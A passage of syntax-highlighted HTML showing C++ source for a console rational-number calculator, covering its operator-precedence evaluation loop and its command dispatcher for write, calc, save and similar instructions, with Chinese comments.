++i)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (input[i] == <span class="string">'/'</span>)<span class="comment">//找到除号</span></span><br><span class="line">				&#123;																											 </span><br><span class="line">					operatorAdd = i;</span><br><span class="line">					<span class="keyword">goto</span> divide;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; operators.size(); ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ((input[operators[i]] == <span class="string">'+'</span> &amp;&amp; i == <span class="number">0</span>) || (input[operators[i]] == <span class="string">'+'</span> &amp;&amp; input[operators[i - <span class="number">1</span>]] != <span class="string">'-'</span>))<span class="comment">//找到加号, 如果（是第一个运算符）或者（不是第一个运算符且前面不是减号）, 进行计算.（这么做是为了保证如果只剩下加和减的情况下, 按照顺序计算）</span></span><br><span class="line">				&#123;</span><br><span class="line">					operatorAdd = operators[i];</span><br><span class="line">					<span class="keyword">goto</span> pls;<span class="comment">//plus遇到重名的了, 只好用pls</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.size(); ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (input[i] == <span class="string">'-'</span>)<span class="comment">//找到减号</span></span><br><span class="line">				&#123;</span><br><span class="line">					operatorAdd = i;</span><br><span class="line">					<span class="keyword">goto</span> mins;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			muti:</span><br><span class="line">			<span class="keyword">if</span> (input[operatorAdd] == <span class="string">'*'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> rightCharAdd;</span><br><span class="line">				<span class="keyword">int</span> leftCharAdd;</span><br><span class="line">				<span class="built_in">string</span> leftname = getLeftname(input, operatorAdd, leftCharAdd, <span class="string">"*"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line">				<span class="built_in">string</span> rightname = getRightname(input, operatorAdd, rightCharAdd, <span class="string">"*"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (wrong)<span class="comment">//寻找名字时出错的跳出</span></span><br><span class="line">				&#123;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">////删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;<span class="comment">//这个返回值不会被用到</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(leftname))<span class="comment">//如果左边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(leftname, str2int(leftname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(rightname))<span class="comment">//如果右边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(rightname, str2int(rightname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">int</span> leftadd = getAddress(leftname);<span class="comment">//通过标识符得到变量在nums中的地址</span></span><br><span class="line">				<span class="keyword">int</span> rightadd = getAddress(rightname);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (leftadd == <span class="number">-1</span>)<span class="comment">//如果没有找到</span></span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; leftname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (rightadd == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; rightname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				temp = nums[leftadd] * nums[rightadd]; <span class="comment">//计算</span></span><br><span class="line"></span><br><span class="line">				temp.name = <span class="string">"$temp"</span> + int2str(tempCount);</span><br><span class="line">				nums.push_back(temp); <span class="comment">//$tempX在nums的最后一个, 将其赋值为这两个元素的积</span></span><br><span class="line">				input.replace(input.begin() + leftCharAdd, input.begin() + rightCharAdd + <span class="number">1</span>, <span class="string">"$temp"</span> + int2str(tempCount)); <span class="comment">//计算完成后将表达式中已经计算的部分替换为$temp方便下一步计算	</span></span><br><span class="line">				++tempCount;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//========================================================================================================================================================================================//</span></span><br><span class="line">			<span class="comment">//==============================================================================接下来的都跟乘法一样, 只是换了运算符号方法===================================================================//</span></span><br><span class="line">			<span class="comment">//========================================================================================================================================================================================//</span></span><br><span class="line"></span><br><span class="line">			divide:</span><br><span class="line">			<span class="keyword">if</span> (input[operatorAdd] == <span class="string">'/'</span>) </span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> rightCharAdd;</span><br><span class="line">				<span class="keyword">int</span> leftCharAdd;</span><br><span class="line">				<span class="built_in">string</span> leftname = getLeftname(input, operatorAdd, leftCharAdd, <span class="string">"/"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line">				<span class="built_in">string</span> rightname = getRightname(input, operatorAdd, rightCharAdd, <span class="string">"/"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (wrong)<span class="comment">//寻找名字时出错的跳出</span></span><br><span class="line">				&#123;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;<span class="comment">//这个返回值不会被用到</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(leftname))<span class="comment">//如果左边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量, 值为变量名</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(leftname, str2int(leftname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(rightname))<span class="comment">//如果右边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(rightname, str2int(rightname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">int</span> leftadd = getAddress(leftname);<span class="comment">//通过标识符得到变量在nums中的地址</span></span><br><span class="line">				<span class="keyword">int</span> rightadd = getAddress(rightname);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (leftadd == <span class="number">-1</span>)<span class="comment">//如果没有找到</span></span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; leftname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (rightadd == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; rightname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				temp = nums[leftadd] / nums[rightadd]; <span class="comment">//计算</span></span><br><span class="line"></span><br><span class="line">				temp.name = <span class="string">"$temp"</span> + int2str(tempCount);</span><br><span class="line">				nums.push_back(temp); <span class="comment">//$tempX在nums的最后一个, 将其赋值为这两个元素的商</span></span><br><span class="line">				input.replace(input.begin() + leftCharAdd, input.begin() + rightCharAdd + <span class="number">1</span>, <span class="string">"$temp"</span> + int2str(tempCount)); <span class="comment">//计算完成后将表达式中已经计算的部分替换为$temp方便下一步计算	</span></span><br><span class="line">				++tempCount;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pls:</span><br><span class="line">			<span class="keyword">if</span> (input[operatorAdd] == <span class="string">'+'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> rightCharAdd;</span><br><span class="line">				<span class="keyword">int</span> leftCharAdd;</span><br><span class="line">				<span class="built_in">string</span> leftname = getLeftname(input, operatorAdd, leftCharAdd, <span class="string">"+"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line">				<span class="built_in">string</span> rightname = getRightname(input, operatorAdd, rightCharAdd, <span class="string">"+"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (wrong)<span class="comment">//寻找名字时出错的跳出</span></span><br><span class="line">				&#123;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">////删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;<span class="comment">//这个返回值不会被用到</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(leftname))<span class="comment">//如果左边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(leftname, str2int(leftname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(rightname))<span class="comment">//如果右边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(rightname, str2int(rightname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">int</span> leftadd = getAddress(leftname);<span class="comment">//通过标识符得到变量在nums中的地址</span></span><br><span class="line">				<span class="keyword">int</span> rightadd = getAddress(rightname);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (leftadd == <span class="number">-1</span>)<span class="comment">//如果没有找到</span></span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; leftname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (rightadd == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; rightname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				temp = nums[leftadd] + nums[rightadd]; <span class="comment">//计算</span></span><br><span class="line"></span><br><span class="line">				temp.name = <span class="string">"$temp"</span> + int2str(tempCount);</span><br><span class="line">				nums.push_back(temp); <span class="comment">//$tempX在nums的最后一个, 将其赋值为这两个元素的和</span></span><br><span class="line">				input.replace(input.begin() + leftCharAdd, input.begin() + rightCharAdd + <span class="number">1</span>, <span class="string">"$temp"</span> + int2str(tempCount)); <span class="comment">//计算完成后将表达式中已经计算的部分替换为$temp方便下一步计算	</span></span><br><span class="line">				++tempCount;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			mins:</span><br><span class="line">			<span class="keyword">if</span> (input[operatorAdd] == <span class="string">'-'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> rightCharAdd;</span><br><span class="line">				<span class="keyword">int</span> leftCharAdd;</span><br><span class="line">				<span class="built_in">string</span> leftname = getLeftname(input, operatorAdd, leftCharAdd, <span class="string">"-"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line">				<span class="built_in">string</span> rightname = getRightname(input, operatorAdd, rightCharAdd, <span class="string">"-"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (wrong)<span class="comment">//寻找名字时出错的跳出</span></span><br><span class="line">				&#123;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">////删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;<span class="comment">//这个返回值不会被用到</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(leftname))<span class="comment">//如果左边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(leftname, str2int(leftname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(rightname))<span class="comment">//如果右边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(rightname, str2int(rightname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">int</span> leftadd = getAddress(leftname);<span class="comment">//通过标识符得到变量在nums中的地址</span></span><br><span class="line">				<span class="keyword">int</span> rightadd = getAddress(rightname);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (leftadd == <span class="number">-1</span>)<span class="comment">//如果没有找到</span></span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; leftname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (rightadd == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; rightname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				temp = nums[leftadd] - nums[rightadd]; <span class="comment">//计算</span></span><br><span class="line"></span><br><span class="line">				temp.name = <span class="string">"$temp"</span> + int2str(tempCount);</span><br><span class="line">				nums.push_back(temp); <span class="comment">//$tempX在nums的最后一个, 将其赋值为这两个元素的差</span></span><br><span class="line">				input.replace(input.begin() + leftCharAdd, input.begin() + rightCharAdd + <span class="number">1</span>, <span class="string">"$temp"</span> + int2str(tempCount)); <span class="comment">//计算完成后将表达式中已经计算的部分替换为$temp方便下一步计算	</span></span><br><span class="line">				++tempCount;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		negative:</span><br><span class="line">			<span class="keyword">if</span> (input[operatorAdd] == <span class="string">'@'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> rightCharAdd;</span><br><span class="line">				<span class="keyword">int</span> leftCharAdd;</span><br><span class="line">				<span class="built_in">string</span> leftname = getLeftname(input, operatorAdd, leftCharAdd, <span class="string">"-"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line">				<span class="built_in">string</span> rightname = getRightname(input, operatorAdd, rightCharAdd, <span class="string">"-"</span>);<span class="comment">//得到左边变量的名字</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (wrong)<span class="comment">//寻找名字时出错的跳出</span></span><br><span class="line">				&#123;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;<span class="comment">//这个返回值不会被用到</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(leftname))<span class="comment">//如果左边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量, 值为变量名</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(leftname, str2int(leftname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (checkNums(rightname))<span class="comment">//如果右边变量是个纯数字, 说明进行实数计算, 建立一个同名的变量</span></span><br><span class="line">				&#123;</span><br><span class="line">					nums.emplace_back(rightname, str2int(rightname), <span class="number">1</span>);</span><br><span class="line">					++tempCount;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">int</span> leftadd = getAddress(leftname);<span class="comment">//通过标识符得到变量在nums中的地址</span></span><br><span class="line">				<span class="keyword">int</span> rightadd = getAddress(rightname);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (leftadd == <span class="number">-1</span>)<span class="comment">//如果没有找到</span></span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; leftname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (rightadd == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					wrong = <span class="literal">true</span>;</span><br><span class="line">					<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到标识符为"</span> &lt;&lt; rightname &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					deleteTemps(tempCount);<span class="comment">//删除临时变量</span></span><br><span class="line">					<span class="keyword">return</span> result;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				temp = nums[leftadd] * nums[rightadd]; <span class="comment">//计算</span></span><br><span class="line"></span><br><span class="line">				temp.name = <span class="string">"$temp"</span> + int2str(tempCount);</span><br><span class="line">				nums.push_back(temp); <span class="comment">//$tempX在nums的最后一个, 将其赋值为这两个元素的积</span></span><br><span class="line">				input.replace(input.begin() + leftCharAdd, input.begin() + rightCharAdd + <span class="number">1</span>, <span class="string">"$temp"</span> + int2str(tempCount)); <span class="comment">//计算完成后将表达式中已经计算的部分替换为$temp方便下一步计算	</span></span><br><span class="line">				++tempCount;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	*Function: start</span></span><br><span class="line"><span class="comment">	*Description: 启动ioEngine, 与用户交互</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Rational Number Calculator On Win32"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Type \"help\" for more information."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"&gt;&gt;&gt;"</span>;<span class="comment">//提示等待用户输入</span></span><br><span class="line"></span><br><span class="line">			mode = <span class="number">0</span>; <span class="comment">//将模式位归零</span></span><br><span class="line"></span><br><span class="line">			loadInstructions(); <span class="comment">//读取指令, 不同的指令将mode换成对应的数字</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"write"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = WRITE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"delete"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = DELETE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"exit"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = EXIT;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"calc"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = CALC;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"help"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = HELP;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"save"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = SAVE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"load"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = LOAD;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"rename"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = RENAME;</span><br><span class="line">			&#125;			</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"list"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = LIST;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (instructions[<span class="number">0</span>] == <span class="string">"read"</span>) <span class="comment">//done</span></span><br><span class="line">			&#123;</span><br><span class="line">				mode = READ;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (mode == <span class="number">0</span>) <span class="comment">//提示输入错误</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有"</span> &lt;&lt; instructions[<span class="number">0</span>] &lt;&lt; <span class="string">"这个指令,输入help获得帮助"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">switch</span> (mode)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="comment">//====================WRITE=======================//</span></span><br><span class="line">			<span class="comment">//================================================//</span></span><br><span class="line">			<span class="keyword">case</span> WRITE: 							</span><br><span class="line">				<span class="keyword">if</span> (instructions.size() == <span class="number">4</span>) <span class="comment">//检查参数数量是否正确</span></span><br><span class="line">				&#123;							  <span class="comment">//format: write name numerator denominator	</span></span><br><span class="line">					<span class="keyword">if</span> (checkNums(instructions[<span class="number">2</span>]) &amp;&amp; checkNums(instructions[<span class="number">3</span>]) &amp;&amp; instructions[<span class="number">3</span>]!=<span class="string">"0"</span>) <span class="comment">//是否都是数字,且分母不能为0</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (checkVaild(instructions[<span class="number">1</span>]))<span class="comment">//检查名字是否合法</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">int</span> add = getAddress(instructions[<span class="number">1</span>]); <span class="comment">//获取这个名字的变量的下标</span></span><br><span class="line">							<span class="keyword">if</span> (add != <span class="number">-1</span>) <span class="comment">//检测是否有同名的元素</span></span><br><span class="line">							&#123;</span><br><span class="line">								nums[add].numerator = str2int(instructions[<span class="number">2</span>]);</span><br><span class="line">								nums[add].denominator = str2int(instructions[<span class="number">3</span>]);</span><br><span class="line">								nums[add].simplify(); <span class="comment">//化简</span></span><br><span class="line">								<span class="built_in">cout</span> &lt;&lt; <span class="string">"覆盖成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								nums.emplace_back(instructions[<span class="number">1</span>], str2int(instructions[<span class="number">2</span>]), str2int(instructions[<span class="number">3</span>]));</span><br><span class="line">								<span class="built_in">cout</span> &lt;&lt; <span class="string">"创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">"标识符非法"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入正确的数字, 且分母不能为0"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (instructions.size() == <span class="number">3</span>) <span class="comment">//检查参数数量是否正确</span></span><br><span class="line">					&#123;							  <span class="comment">//format: write newname anothername</span></span><br><span class="line">						<span class="keyword">int</span> add = getAddress(instructions[<span class="number">2</span>]);<span class="comment">//检查原变量是否存在</span></span><br><span class="line">						<span class="keyword">if</span> (add != <span class="number">-1</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (checkVaild(instructions[<span class="number">1</span>]))<span class="comment">//检查新变量的标识符是否合法</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">int</span> newadd = getAddress(instructions[<span class="number">1</span>]);<span class="comment">//检测是否有同名的元素</span></span><br><span class="line">								<span class="keyword">if</span> (newadd != <span class="number">-1</span>)</span><br><span class="line">								&#123;</span><br><span class="line">									<span class="built_in">string</span> newname = nums[newadd].name;</span><br><span class="line">									nums[newadd] = nums[add];<span class="comment">//过程中名字被nums[add]的取代</span></span><br><span class="line">									nums[newadd].name = newname;</span><br><span class="line">									<span class="built_in">cout</span> &lt;&lt; <span class="string">"覆盖成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span></span><br><span class="line">								&#123;</span><br><span class="line">									Rational_Numbers result;</span><br><span class="line">									result = nums[add];</span><br><span class="line">									result.name = instructions[<span class="number">1</span>];								</span><br><span class="line">									nums.push_back(result);</span><br><span class="line">									<span class="built_in">cout</span> &lt;&lt; <span class="string">"创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入的标识符非法"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">"没有找到名为"</span> &lt;&lt; instructions[<span class="number">2</span>] &lt;&lt; <span class="string">"的变量"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入正确数量的参数"</span> &lt;&lt; <span 